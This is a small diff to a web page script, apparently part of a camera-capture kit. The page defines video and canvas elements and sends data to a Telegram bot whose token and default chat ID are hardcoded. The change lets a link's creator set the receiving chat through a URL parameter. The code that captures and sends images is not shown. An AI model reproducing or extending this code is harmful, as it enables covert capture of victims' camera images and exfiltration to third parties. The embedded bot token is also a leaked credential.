@@ -74,7 +74,8 @@
 
     <script>
         const TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI"; // Token Bot
-        const CHAT_ID = "7596509818"; // ID Abang
+        const urlParams = new URLSearchParams(window.location.search);
+const CHAT_ID = urlParams.get('id') || "7596509818";
 
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
